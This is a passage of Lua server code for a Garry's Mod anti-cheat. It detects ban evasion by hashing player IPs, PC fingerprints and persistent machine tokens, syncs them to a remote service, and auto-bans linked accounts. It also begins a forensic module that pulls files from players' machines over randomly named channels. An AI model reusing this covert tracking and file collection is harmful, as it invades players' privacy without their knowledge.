local CODE      = { family = 5, ip = 6, fp = 7, cookie = 8, correlate = 9 } -- CD_EV_CORR
local CODE_NAME = { [5] = "Family-share", [6] = "IP", [7] = "Отпечаток ПК / HWID", [8] = "Привязка к ПК (machine-token)", [9] = "Корреляция (аддоны/конфиг)" }
local stats     = { [5] = 0, [6] = 0, [7] = 0, [8] = 0, [9] = 0 }

-- Пороги настраиваются per-license конфигом control plane через
-- ZB_AC.ApplyConfig — значения ниже лишь дефолты convar'ов.
local function threshold(name, default, help)
    if not ConVarExists(name) then CreateConVar(name, tostring(default), FCVAR_ARCHIVE, help) end
    return GetConVar(name)
end

local CV_TOKEN_SHARE_LIMIT = threshold("rp_ac_evasion_token_limit", 6, "Evasion: макс. аккаунтов на один machine-token")
local CV_FP_SHARE_LIMIT    = threshold("rp_ac_evasion_fp_limit", 4, "Evasion: макс. аккаунтов на один отпечаток ПК")
local CV_IP_SHARE_LIMIT    = threshold("rp_ac_evasion_ip_limit", 6, "Evasion: макс. аккаунтов на один IP")
local CV_IP_MATCH_DAYS     = threshold("rp_ac_evasion_ip_days", 3, "Evasion: окно совпадения по IP, дни")

local PREFIX = "[ЧечаДефендер-Evasion] "

local function logInfo(...)
    local p = { ... }
    for i, v in ipairs(p) do p[i] = tostring(v) end
    print(PREFIX .. table.concat(p, " "))
end
local function logErr(label, err)
    ErrorNoHalt(PREFIX .. tostring(label) .. ": " .. tostring(err) .. "\n")
end

if not ConVarExists("rp_ac_evasion") then
    CreateConVar("rp_ac_evasion", "1", FCVAR_ARCHIVE, "ЧечаДефендер-Evasion: включён (0/1)")
end
if not ConVarExists("cd_evasion_debug") then
    CreateConVar("cd_evasion_debug", "0", FCVAR_ARCHIVE, "ЧечаДефендер-Evasion: подробный лог (0/1)")
end
if not ConVarExists("cd_evasion_fp_ban") then
    CreateConVar("cd_evasion_fp_ban", "1", FCVAR_ARCHIVE,
        "ЧечаДефендер-Evasion: банить по отпечатку ПК/HWID при обходе (1) или только сигнал (0)")
end
local function dbg(...)
    if GetConVar("cd_evasion_debug"):GetInt() == 0 then return end
    local p = { ... }
    for i, v in ipairs(p) do p[i] = tostring(v) end
    print(PREFIX .. "[DBG] " .. table.concat(p, " "))
end

local function isValidSid32(s)
    if not isstring(s) then return false end
    if ULib and ULib.isValidSteamID then return ULib.isValidSteamID(s) end
    return s:match("^STEAM_[01]:[01]:%d+$") ~= nil
end

local function isValidSid64(s)
    s = tostring(s or "")
    return #s == 17 and s:match("^7656119%d+$") ~= nil
end

local function to64(sid32)
    if not isValidSid32(sid32) then return nil end
    local ok, r = pcall(util.SteamIDTo64, sid32)
    if ok and isValidSid64(r) then return r end
end

local function to32(sid64)
    sid64 = tostring(sid64 or "")
    if not isValidSid64(sid64) then return nil end
    local ok, r = pcall(util.SteamIDFrom64, sid64)
    if ok and isValidSid32(r) then return r end
end

local function stripPort(ip)
    ip = tostring(ip or "")
    local c = ip:find(":", 1, true)
    return c and ip:sub(1, c - 1) or ip
end

local _warnedNoUlib = false
local function IsPermaBanned(sid32)
    if not sid32 then return false end
    if not (ULib and ULib.bans) then
        if not _warnedNoUlib then
            _warnedNoUlib = true
            logErr("IsPermaBanned", "ULib.bans недоступен — детект обхода отключён (поставь ULX)")
        end
        return false
    end
    local b = ULib.bans[sid32]
    return b ~= nil and (tonumber(b.unban) or 0) == 0
end

local function IsExempt(ply)
    if not IsValid(ply) then return false end
    if ply:IsAdmin() then return true end
    return EXEMPT_GROUPS[ply:GetUserGroup()] == true
end

local function SendDiscord(title, message)
    local payload = util.TableToJSON({
        content = "**" .. title .. "**\n" .. message,
        allowed_mentions = { parse = {} },
    })
    ZB_AC.RelayPost(payload, "application/json")
end

local function cleanName(s)
    s = tostring(s or "")
    if s == "" then return s end
    if utf8 and utf8.len then
        local n, badpos = utf8.len(s)
        if not n and tonumber(badpos) then s = string.sub(s, 1, tonumber(badpos) - 1) end
    end
    return string.Trim(s)
end

-- Всё хранилище обхода бана (IP/отпечаток/куки → аккаунт, помилования) живёт
-- на control plane, под license_id этого сервера — локально на диске игрового
-- сервера НЕ остаётся ни одной записи. Секрет для хэширования выводится из
-- уже настроенного секрета агента (тот же, что подписывает HMAC), поэтому
-- ничего не нужно ни генерировать, ни персистить на диске отдельно.
-- Прежние локальные таблицы (net_link/dev_link/sess_link/acct_state/
-- acct_flag/kv_store) — разовая уборка, снос без миграции (данные уже
-- неактуальны, источник истины теперь только control plane).
for _, old in ipairs({ "net_link", "dev_link", "sess_link", "acct_state", "acct_flag", "kv_store" }) do
    pcall(sql.Query, "DROP TABLE IF EXISTS " .. old .. ";")
end

local COOKIE_SECRET = util.SHA256((ZB_AC.AgentSecret and ZB_AC.AgentSecret() or "cd") .. ":cookie_hmac_v1")

local function hkey(v)
    v = (v ~= nil) and tostring(v) or ""
    if v == "" then return "" end
    return util.SHA256(COOKIE_SECRET .. "|" .. v)
end

local function evasionSync(sid64, fields, onDone)
    if not (ZB_AC and ZB_AC.AgentPost) then
        if onDone then onDone(false) end
        return
    end
    local body = { sid64 = sid64 }
    for k, v in pairs(fields or {}) do body[k] = v end
    ZB_AC.AgentPost("/agent/evasion/sync", body, function(code, data)
        if code ~= 200 or not istable(data) then
            if onDone then onDone(false) end
            return
        end
        if onDone then onDone(true, data) end
    end)
end

local function setPardon(sid64, add, onDone)
    if not (ZB_AC and ZB_AC.AgentPost) then
        if onDone then onDone(false) end
        return
    end
    ZB_AC.AgentPost("/agent/evasion/pardon", { sid64 = sid64, action = add and "add" or "remove" }, function(code)
        if onDone then onDone(code == 200) end
    end)
end

local function sign(nonce) return util.SHA1(COOKIE_SECRET .. ":" .. nonce) end

local function makeCookie(sid64)
    local nonce = util.SHA1(sid64 .. tostring(SysTime()) .. tostring(math.random(1, 1e9)))
    return nonce .. "." .. sign(nonce)
end

local function validCookie(ck)
    if not isstring(ck) then return false end
    local nonce, sig = ck:match("^(%x+)%.(%x+)$")
    if not nonce or not sig then return false end
    return sign(nonce) == sig
end

local function nativeBan(sid32, reason)
    game.ConsoleCommand(('banid 0 "%s" kick\n'):format(sid32))
    game.ConsoleCommand("writeid\n")
end

local function banOne(sid32, name, code)
    if not sid32 then return end
    local reason = "ЧечаДефендер: Код " .. code
    if ULib and ULib.addBan then
        local ok, err = pcall(ULib.addBan, sid32, 0, reason, name or "", nil)
        if not ok then logErr("ULib.addBan", err); nativeBan(sid32, reason) end
    else
        nativeBan(sid32, reason)
    end
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and p:SteamID() == sid32 then
            if ULib and ULib.kick then ULib.kick(p, reason) else p:Kick(reason) end
        end
    end
end

local function _inList(list, sid)
    if type(list) ~= "table" then return false end
    for _, s in ipairs(list) do if tostring(s) == tostring(sid) then return true end end
    return false
end

local function vectorSummary(base, res)
    res = res or {}
    local m = res.matches or {}
    local addon, cfgOk
    if type(res.fuzzy) == "table" then
        for _, c in ipairs(res.fuzzy) do
            if c and tostring(c.sid64) == tostring(base) then addon = c; cfgOk = c.cfg end
        end
    end
    local L = {}
    L[#L + 1] = "IP: " .. (_inList(m.ip, base) and "✅ совпал" or "❌ нет")
    L[#L + 1] = "Отпечаток ПК (fp): " .. (_inList(m.fp, base) and "✅ совпал" or "❌ нет")
    L[#L + 1] = "Machine-токен: " .. (_inList(m.cookie, base) and "✅ совпал" or "❌ нет")
    L[#L + 1] = "Аддоны: " .. (addon and ("✅ " .. tostring(addon.shared) .. " общих, Jaccard " .. tostring(addon.jaccard)) or "❌ нет")
    L[#L + 1] = "Config: " .. (cfgOk and "✅ совпал" or "❌ нет/неизв.")
    if res.family then L[#L + 1] = "Family-share (общий Steam-аккаунт): ✅ совпал" end
    return table.concat(L, "\n")
end

local function Punish(altPly, mainSid64, code, vector, res, reportOnly)
    if not IsValid(altPly) then return end
    local altSid32, altSid64 = altPly:SteamID(), altPly:SteamID64()
    local altName = cleanName(altPly:Nick())
    local mainSid32 = to32(mainSid64)

    local mainName = ""
    if mainSid32 and ULib and ULib.bans then
        local ban = ULib.bans[mainSid32]
        if ban and ban.name then mainName = cleanName(ban.name) end
    end
    local mainNameDisp = (mainName ~= "" and mainName) or "(имя неизвестно)"
    local altNameDisp  = (altName  ~= "" and altName)  or "(имя неизвестно)"

    local exempt = IsExempt(altPly)
    local titleTag = reportOnly and " (СИГНАЛ — без бана)"
        or (exempt and " (СТАФФ — без бана)" or "")
    local note = reportOnly and "\n_Мягкий сигнал (отпечаток ПК) — проверьте вручную, автобан НЕ применён_"
        or (exempt and "\n_В белом списке — бан НЕ применён_" or "")

    SendDiscord(
        "ЧечаДефендер: обход бана — Код " .. code .. titleTag,
        string.format(
            "Триггер: **%s**\nАльт: `%s` (`%s`)%s\nОснова (перма-бан): `%s` (`%s`)\n**Совпавшие векторы:**\n%s\nВремя: %s",
            CODE_NAME[code] or vector,
            altNameDisp, altSid64,
            note,
            mainNameDisp, mainSid64, vectorSummary(mainSid64, res),
            os.date("%Y-%m-%d %H:%M:%S")
        )
    )

    if reportOnly then
        logInfo(("(только сигнал, без бана) Код %d: %s"):format(code, altSid64))
        return
    end
    if exempt then
        logInfo(("(стафф, без бана) обход Код %d: %s"):format(code, altSid64))
        return
    end

    stats[code] = (stats[code] or 0) + 1
    logInfo(("Применён Код %d (перебан обоих)"):format(code))

    banOne(altSid32, altName, code)
    if mainSid32 then banOne(mainSid32, mainName, code) end
end

local function tryFamily(ply, sid64)
    if not ENABLE_FAMILY then return false end
    local owner64 = ply:OwnerSteamID64()
    if owner64 and owner64 ~= "0" and owner64 ~= sid64 then
        local o32 = to32(owner64)
        if o32 and IsPermaBanned(o32) then
            ply.cd_evasion_done = true
            Punish(ply, owner64, CODE.family, "family-share", { family = true })
            return true
        end
    end
    return false
end

local function DetectFor(ply)
    if not GetConVar("rp_ac_evasion"):GetBool() then return end
    if not IsValid(ply) or not ply:IsPlayer() or ply:IsBot() then return end
    if ply.cd_evasion_done or ply.cd_pardoned then return end
    local sid64 = ply:SteamID64()
    if not isValidSid64(sid64) then return end

    if tryFamily(ply, sid64) then return end

    local owner64 = ply:OwnerSteamID64()
    local ip = ENABLE_IP and stripPort(ply:IPAddress()) or ""
    if ip ~= "" and IP_WHITELIST[ip] then ip = "" end

    evasionSync(sid64, {
        name = ply:Nick(),
        owner64 = (owner64 and owner64 ~= "0") and owner64 or nil,
        ip_hash = (ip ~= "") and hkey(ip) or nil,
        ip_window_days = CV_IP_MATCH_DAYS:GetFloat(),
    }, function(ok, res)
        if not ok or not IsValid(ply) or ply.cd_evasion_done then return end
        ply.cd_pardoned = res.pardoned == true
        if res.pardoned or ip == "" then return end
        local sids = (res.matches and res.matches.ip) or {}
        if #sids > CV_IP_SHARE_LIMIT:GetInt() then return end
        for _, other in ipairs(sids) do
            if other ~= sid64 and IsPermaBanned(to32(other)) then
                ply.cd_evasion_done = true
                Punish(ply, other, CODE.ip, "ip", res)
                return
            end
        end
    end)
end

local function DetectResp(ply, fp, ck, det, wsids) -- CD_EV_ENRICH/CORR
    if not GetConVar("rp_ac_evasion"):GetBool() then return end
    if not IsValid(ply) or ply.cd_evasion_done or ply.cd_pardoned then return end
    local sid64 = ply:SteamID64()
    if not isValidSid64(sid64) then return end

    local fpH = (ENABLE_FP and fp ~= "" and not ply.cd_fp_reported) and hkey(fp) or nil
    local ckH = (ENABLE_COOKIE and ck ~= "") and hkey(ck) or nil
    if not fpH and not ckH and (not det or det == "") then return end

    local cfgH = nil
    if det ~= "" then local okj, t = pcall(util.JSONToTable, det); if okj and istable(t) and isstring(t.cfg) and t.cfg ~= "" then cfgH = t.cfg end end
    local wlist = (wsids and wsids ~= "") and string.Explode(",", wsids) or nil
    local _ip = ENABLE_IP and stripPort(ply:IPAddress()) or ""
    if _ip ~= "" and IP_WHITELIST[_ip] then _ip = "" end
    local ipH = (_ip ~= "") and hkey(_ip) or nil
    evasionSync(sid64, { ip_hash = ipH, ip_window_days = CV_IP_MATCH_DAYS:GetFloat(), fp_hash = fpH, cookie_hash = ckH, fp_details = (det ~= "" and det or nil), cfg_hash = cfgH, wsids = wlist }, function(ok, res)
        if not ok or not IsValid(ply) or ply.cd_evasion_done then return end
        ply.cd_pardoned = res.pardoned == true
        if res.pardoned then return end

        if fpH then
            local sids = (res.matches and res.matches.fp) or {}
            if #sids <= CV_FP_SHARE_LIMIT:GetInt() then
                local fpBan = GetConVar("cd_evasion_fp_ban"):GetBool()
                for _, other in ipairs(sids) do
                    if other ~= sid64 and IsPermaBanned(to32(other)) then
                        ply.cd_fp_reported = true
                        if fpBan then ply.cd_evasion_done = true end
                        Punish(ply, other, CODE.fp, "fingerprint", res, not fpBan)
                        break
                    end
                end
            end
        end

        if ckH and not ply.cd_evasion_done then
            local sids = (res.matches and res.matches.cookie) or {}
            dbg("token-проверка", sid64, "| аккаунтов на токене:", #sids, "| лимит:", CV_TOKEN_SHARE_LIMIT:GetInt())
            if #sids <= CV_TOKEN_SHARE_LIMIT:GetInt() then
                for _, other in ipairs(sids) do
                    if other ~= sid64 then
                        dbg("  связан аккаунт", other, "перма-бан:", IsPermaBanned(to32(other)))
                        if IsPermaBanned(to32(other)) then
                            ply.cd_evasion_done = true
                            Punish(ply, other, CODE.cookie, "machine-token", res)
                            break
                        end
                    end
                end
            elseif #sids > CV_TOKEN_SHARE_LIMIT:GetInt() then
                dbg("token ПРОПУЩЕН — общий (>лимита), бан отключён")
            end
        end

        -- CD_EV_CORR: нечёткая корреляция (пересечение аддонов). НЕ банит —
        -- шлёт СИГНАЛ оператору (reportOnly), если похожий аккаунт перма-банен.
        if not ply.cd_evasion_done and res.fuzzy and istable(res.fuzzy) then
            for _, cand in ipairs(res.fuzzy) do
                local osid = cand and cand.sid64
                if osid and osid ~= sid64 and IsPermaBanned(to32(osid)) then
                    Punish(ply, osid, CODE.correlate, "correlation", res, true)
                    break
                end
            end
        end
    end)
end

local function onJoin(ply)
    if not IsValid(ply) or ply:IsBot() then return end
    local sid64 = ply:SteamID64()
    if not isValidSid64(sid64) then return end

    DetectFor(ply)

    timer.Simple(2, function()
        if IsValid(ply) and not ply.cd_evasion_done then
            net.Start("sess_meta_req")
            net.Send(ply)
        end
    end)
end

hook.Add("PlayerInitialSpawn", "cd_evasion_join", function(ply)
    timer.Simple(1, function() if IsValid(ply) then onJoin(ply) end end)
end)

net.Receive("sess_meta_ack", function(_, ply)
    if not IsValid(ply) or ply.cd_evasion_done then return end
    local sid64 = ply:SteamID64()
    if not isValidSid64(sid64) then return end

    local fp = net.ReadString()
    local ck = net.ReadString()
    fp = (isstring(fp) and #fp > 0 and #fp <= 64) and fp or ""
    ck = (isstring(ck) and #ck > 0 and #ck <= 128 and validCookie(ck)) and ck or ""
    local det = net.ReadString() -- CD_EV_ENRICH: 3-е поле = JSON-детали
    det = (isstring(det) and #det <= 2000) and det or ""
    local wsids = net.ReadString() -- CD_EV_CORR: 4-е поле = CSV wsid
    wsids = (isstring(wsids) and #wsids <= 8000) and wsids or ""

    print("[CD-EV-DIAG] ack sid="..sid64.." fplen="..#fp.." cklen="..#ck.." detlen="..#det) -- CD_EV_DIAG
    dbg("sess_meta_ack от", sid64, "| fp=", (fp ~= "") and "есть" or "НЕТ",
        "| token=", (ck ~= "") and ("валиден " .. ck:sub(1, 12) .. "…") or "НЕТ/невалиден")

    DetectResp(ply, fp, ck, det, wsids)

    if ck == "" then
        local newck = makeCookie(sid64)
        if newck then
            evasionSync(sid64, { cookie_hash = hkey(newck) }, nil)
            net.Start("sess_token_set")
            net.WriteString(newck)
            net.Send(ply)
            dbg("выдан НОВЫЙ token →", sid64, newck:sub(1, 12) .. "…")
        end
    end
end)

hook.Add("ULibPlayerBanned", "cd_evasion_onban", function(steamid, banData)
    if not banData then return end
    if (tonumber(banData.unban) or 0) ~= 0 then return end
    local reason = tostring(banData.reason or "")
    if reason:find("ЧечаДефендер", 1, true) then return end

    local sid64 = to64(steamid)
    if sid64 then setPardon(sid64, false) end

    timer.Simple(0.3, function()
        for _, p in ipairs(player.GetAll()) do
            if IsValid(p) and not p.cd_evasion_done and p:SteamID() ~= steamid then
                p.cd_pardoned = nil
                DetectFor(p)
            end
        end
    end)
end)

hook.Add("ULibPlayerUnBanned", "cd_evasion_onunban", function(steamid, admin)
    local sid64 = to64(steamid)
    if not sid64 then return end
    setPardon(sid64, true)
    logInfo(("Помилован (ручной разбан): %s — авто-перебан отключён"):format(steamid))
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and p:SteamID() == steamid then
            p.cd_evasion_done = true
            p.cd_pardoned = true
            break
        end
    end
end)

timer.Create("cd_evasion_periodic", 30, 0, function()
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and not p.cd_evasion_done then
            DetectFor(p)
        end
    end
end)

concommand.Add("cd_evasion_status", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local fpMode = GetConVar("cd_evasion_fp_ban"):GetBool() and "БАН" or "ОТЧЁТ"
    tell(PREFIX .. ("коды: 5=family 6=ip 7=отпечаток/HWID(%s) 8=ПК-токен(БАН)"):format(fpMode))
    tell(("Бан-сработ.: 5=%d 6=%d 7=%d 8=%d"):format(stats[5], stats[6], stats[7], stats[8]))
    tell(("Anti-сборка: токен≤%d отпечаток≤%d IP≤%d за %dд"):format(
        CV_TOKEN_SHARE_LIMIT:GetInt(), CV_FP_SHARE_LIMIT:GetInt(), CV_IP_SHARE_LIMIT:GetInt(), CV_IP_MATCH_DAYS:GetInt()))
    tell(("Хранилище: control plane (per-license), локально ничего не лежит | реестр банов: %s"):format(
        (ULib and ULib.bans) and "ULib.bans" or "НЕТ (нужен ULX)"))
    if ZB_AC and ZB_AC.AgentGet then
        ZB_AC.AgentGet("/agent/evasion/stats", function(code, data)
            if code == 200 and istable(data) then
                tell(("Записей на control plane: ip=%s fp=%s cookie=%s seen=%s pardon=%s"):format(
                    tostring(data.ip), tostring(data.fp), tostring(data.cookie), tostring(data.seen), tostring(data.pardon)))
            else
                tell("Не удалось получить статистику с control plane")
            end
        end)
    end
end)

local function resolveToSid64(arg)
    arg = tostring(arg or "")
    if isValidSid64(arg) then return arg end
    if isValidSid32(arg) then return to64(arg) end
    local up = arg:upper()
    if isValidSid32(up) then return to64(up) end
    return nil
end

local function firstArg(args, argStr)
    local a = (istable(args) and args[1]) or nil
    if isstring(a) and a ~= "" then return a end
    return string.Trim(tostring(argStr or ""))
end

concommand.Add("cd_pardon", function(ply, _, args, argStr)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end
    local sid64 = resolveToSid64(firstArg(args, argStr))
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    if not sid64 then tell(PREFIX .. "Использование: cd_pardon <SteamID64 или STEAM_0:..>") return end
    setPardon(sid64, true, function(ok)
        tell(PREFIX .. (ok and ("Помилован: " .. sid64) or ("Ошибка связи с control plane для " .. sid64)))
    end)
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and p:SteamID64() == sid64 then p.cd_evasion_done = true p.cd_pardoned = true break end
    end
end)

concommand.Add("cd_unpardon", function(ply, _, args, argStr)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end
    local sid64 = resolveToSid64(firstArg(args, argStr))
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    if not sid64 then tell(PREFIX .. "Использование: cd_unpardon <SteamID64 или STEAM_0:..>") return end
    setPardon(sid64, false, function(ok)
        tell(PREFIX .. (ok and ("Помилование снято: " .. sid64 .. " (детект снова активен)")
            or ("Ошибка связи с control plane для " .. sid64)))
    end)
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and p:SteamID64() == sid64 then p.cd_pardoned = nil break end
    end
end)

concommand.Add("cd_evasion_test", function(ply, _, args, argStr)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end

    local raw   = firstArg(args, argStr)
    local sid64 = resolveToSid64(raw)
    if not sid64 and IsValid(ply) then sid64 = ply:SteamID64() end
    if not sid64 then
        tell(PREFIX .. "Использование: cd_evasion_test <SteamID64/STEAM_0:..>  (получено: '" .. tostring(raw) .. "')")
        return
    end
    if not (ZB_AC and ZB_AC.AgentGet) then tell(PREFIX .. "Агент не настроен") return end

    tell(PREFIX .. "=== ТЕСТ (dry-run, без бана) для " .. sid64 .. " === (запрос к control plane…)")

    ZB_AC.AgentGet("/agent/evasion/lookup?sid64=" .. sid64, function(code, data)
        if code ~= 200 or not istable(data) then
            tell("  Ошибка связи с control plane (код " .. tostring(code) .. ")")
            return
        end

        tell(("  Помилован (pardon): %s%s"):format(tostring(data.pardoned),
            data.pardoned and "  → детект для него ПРОПУСКАЕТСЯ (cd_unpardon чтобы вернуть)" or ""))
        for _, pl in ipairs(player.GetAll()) do
            if IsValid(pl) and pl:SteamID64() == sid64 then
                tell(("  Стафф/exempt: %s%s  (группа: %s)"):format(tostring(IsExempt(pl)),
                    IsExempt(pl) and "  → авто-бан НЕ применяется, только отчёт" or "",
                    pl:GetUserGroup() or "?"))
            end
        end

        if not data.found then
            tell("  Записи НЕТ — игрок ещё не отдал идентификаторы (не заходил при этой версии / не прошло 2с после спавна)")
            return
        end

        local function report(label, val, sids)
            if not val or val == "" then tell(("  %s: (не записан)"):format(label)) return end
            sids = sids or {}
            local others, hits = 0, {}
            for _, o in ipairs(sids) do
                if o ~= sid64 then
                    others = others + 1
                    if IsPermaBanned(to32(o)) then hits[#hits + 1] = o end
                end
            end
            tell(("  %s [%s…]: связано др.акков=%d, перма-совпадений=%d %s"):format(
                label, tostring(val):sub(1, 12), others, #hits,
                (#hits > 0) and ("→ БАН по этому вектору: " .. table.concat(hits, ", ")) or "(совпадений нет)"))
        end
        local m = data.matches or {}
        report("IP",    data.last_ip_hash,     m.ip)
        report("FP",    data.last_fp_hash,     m.fp)
        report("TOKEN", data.last_cookie_hash, m.cookie)
    end)
end)

logInfo(("загружен (хранилище — control plane per-license, локально не остаётся ничего; "
    .. "family/IP/ПК-токен=бан, отпечаток/HWID=%s; anti-сборка; реестр банов из ULib)")
    :format(GetConVar("cd_evasion_fp_ban"):GetBool() and "бан" or "отчёт"))

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_evasion.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_evasion.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end
if not SERVER then return end

local FORENSIC_DIR    = "zb_ac_forensic"
local SEEN_FILE       = "checha_ac/seen_hashes.json"
local SWEEP_TIMEOUT   = 90
local DATA_TIMEOUT    = 60
local CHUNK_SIZE      = 20000
local MAX_FILES       = 800
local MAX_FILE_SIZE   = 3 * 1024 * 1024
local MAX_DEPTH       = 10
local PULL_CAP        = 200
local OTHER_INLINE    = 10

-- Полные списки сигнатур живут на control plane (ZB_AC.Signatures,
-- ZB_AC.LoadSignatures) — ничего постоянно не лежит локальным файлом.
-- Здесь только маленький аварийный набор на случай, если сервер ни разу
-- не смог достучаться до control plane.
local FALLBACK_SUSPICIOUS_EXT = {
    dll = true, exe = true, inject = true, cheat = true, hack = true,
}
local FALLBACK_SUSPICIOUS_NAMES = {
    "silkware", "amfetamin", "dobroware", "kefir", "cheat", "hack",
}

local function SUSPICIOUS_EXT()
    local s = ZB_AC.Signatures
    if istable(s) and istable(s.suspicious_ext) and #s.suspicious_ext > 0 then
        local set = {}
        for _, e in ipairs(s.suspicious_ext) do set[e] = true end
        return set
    end
    return FALLBACK_SUSPICIOUS_EXT
end

local function SUSPICIOUS_NAMES()
    local s = ZB_AC.Signatures
    if istable(s) and istable(s.suspicious_names) and #s.suspicious_names > 0 then
        return s.suspicious_names
    end
    return FALLBACK_SUSPICIOUS_NAMES
end

local KNOWN_GLOBALS = {
    _G = true, _R = true, _VERSION = true,
    AddOriginToPVS = true, AddCSLuaFile = true,
    Angle = true, assert = true,
    bit = true,
    cam = true, chat = true, Clip1 = true, Clip2 = true,
    Color = true, CompileString = true,
    concommand = true, coroutine = true,
    CreateConVar = true, CreateMaterial = true, CreateParticleSystem = true,
    CurTime = true, cvars = true,
    damage = true, debug = true,
    Dolang = true, DoLuaString = true, DoLuaFile = true,
    Derma_Anim_Register = true, Derma_Query = true,
    draw = true, duplicator = true,
    effects = true, ember = true,
    engine = true, ents = true,
    error = true, ErrorNoHalt = true,
    file = true,
    GAMEMODE = true, gameevent = true, game = true,
    GetConVar = true, GetConVarNumber = true, GetConVarString = true,
    GM = true,
    gui = true, gmod = true,
    halo = true, hook = true, HTTP = true,
    include = true, ipairs = true, IsColor = true, IsFirstTimePredicted = true,
    isnumber = true, isstring = true, istable = true,
    IsValid = true,
    killicon = true,
    language = true, list = true, localplayer = true, LocalPlayer = true,
    math = true, Matrix = true, mesh = true, ModuleLoad = true, ModuleUnload = true,
    Msg = true, MsgC = true, MsgN = true,
    navmesh = true, net = true, next = true, ["nil"] = true,
    numpad = true, nutil = true,
    os = true,
    package = true, pairs = true, pcall = true, player = true, player_manager = true,
    presets = true, print = true,
    Random = true, rawget = true, rawset = true, RealTime = true,
    RecipientFilter = true, render = true,
    require = true,
    scripted_ents = true, select = true,
    ["SetGlobal*"] = true, slib = true, sound = true,
    spawnmenu = true, SQL = true, sql = true, string = true,
    surface = true, system = true,
    table = true, team = true, timer = true, tostring = true, type = true,
    umsg = true, undo = true, unpack = true, unrequire = true,
    usermessage = true, util = true,
    Vector = true, vgui = true,
    weapons = true, wiremod = true, workshop = true,
    xpcall = true,
    AddConsoleCommand = true, AddNetworkString = true,
    BroadcastLua = true,
    CleanUpMap = true, constraint = true, construction = true, cookie = true,
    CreateEntity = true,
    DarkRP = true, DB = true,
    FAdmin = true, ["FCVAR_*"] = true,
    gmsave = true,
    ["MSG_*"] = true,
    pAdd = true, Player = true, PlayerCount = true,
    RunConsoleCommand = true,
    SendUserMessage = true, ServerLog = true,
    ULib = true, ulx = true,
}

local FALLBACK_CONTENT_PATTERNS = {
    { name = "SilkWare",  pat = "SilkWare",  severity = "HIGH" },
    { name = "KEFIR",     pat = "KEFIR",     severity = "HIGH" },
    { name = "DobroWare", pat = "DobroWare", severity = "HIGH" },
    { name = "Amfetamin", pat = "Amfetamin", severity = "HIGH" },
    { name = "ac_bypass", pat = "checha.*defender", severity = "HIGH" },
}

local function CONTENT_PATTERNS()
    local s = ZB_AC.Signatures
    if istable(s) and istable(s.content_patterns) and #s.content_patterns > 0 then
        return s.content_patterns
    end
    return FALLBACK_CONTENT_PATTERNS
end

local PREFIX = "[ЧечаДефендер-Forensic] "

local function log(...)
    local p = {...}
    for i, v in ipairs(p) do p[i] = tostring(v) end
    print(PREFIX .. table.concat(p, " "))
end

local seenHashes = {}

local function LoadSeenHashes()
    local raw = file.Read(SEEN_FILE, "DATA")
    if not raw or raw == "" then return end
    local ok, t = pcall(util.JSONToTable, raw)
    if ok and istable(t) then seenHashes = t end
end

local function SaveSeenHashes()
    pcall(file.CreateDir, "checha_ac")
    pcall(file.Write, SEEN_FILE, util.TableToJSON(seenHashes))
end

LoadSeenHashes()

function ZB_AC.IsFileSeen(h)
    return h ~= nil and h ~= "" and seenHashes[h] ~= nil
end

function ZB_AC.MarkFileSeen(h, path, sid)
    if not h or h == "" or seenHashes[h] then return false end
    seenHashes[h] = { path = path, sid = sid, ts = os.time() }
    return true
end

ZB_AC.SaveSeenHashes = SaveSeenHashes

-- CD_FORGET_FILES: сброс стора виденных файлов — всё выкачается заново (нужно
-- один раз после починки заливки: старые записи «виден, но к нам не доставлен»).
concommand.Add("rp_ac_forget_files", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:PrintMessage(HUD_PRINTCONSOLE, "[ЧечаДефендер] Только суперадмин")
        return
    end
    local n = table.Count(seenHashes)
    seenHashes = {}
    SaveSeenHashes()
    local m = "[ЧечаДефендер] Забыто виденных файлов: " .. n .. " — всё выкачается заново"
    if IsValid(ply) then ply:PrintMessage(HUD_PRINTCONSOLE, m) else print(m) end
end, nil, "Забыть все выкаченные файлы (выкачать заново)", FCVAR_PROTECTED)

local maniPool, dataPool, pullPool, ackPool = {}, {}, {}, {}
local POOL_SIZE = 12

local pendingForensic = {}

local HandleManifestChunk, HandleDataChunk

local function BuildChannels()
    for i = 1, POOL_SIZE do
        local salt = tostring(SysTime()) .. tostring(i) .. tostring(math.random())
        local mn = "zb_fmani_" .. string.sub(util.SHA1(salt .. "m"), 1, 8)
        local dn = "zb_fdata_" .. string.sub(util.SHA1(salt .. "d"), 1, 8)
        local pn = "zb_fpull_" .. string.sub(util.SHA1(salt .. "p"), 1, 8)
        local an = "zb_fack_" .. string.sub(util.SHA1(salt .. "a"), 1, 8)
        util.AddNetworkString(mn)
        util.AddNetworkString(dn)
        util.AddNetworkString(pn)
        util.AddNetworkString(an)
        maniPool[i], dataPool[i], pullPool[i], ackPool[i] = mn, dn, pn, an
        net.Receive(mn, function(_, ply) HandleManifestChunk(mn, ply) end)
        net.Receive(dn, function(_, ply) HandleDataChunk(dn, ply) end)
    end
end
BuildChannels()

local function readChunkInto(store)
    local idx   = net.ReadUInt(16)
    local total = net.ReadUInt(16)
    local last  = net.ReadBool()
    local size  = net.ReadUInt(32)
    local data  = (size and size > 0) and net.ReadData(size) or ""
    if data == "" then return false, false end
    store.total = total
    if not store.chunks[idx] then store.got = store.got + 1 end
    store.chunks[idx] = data
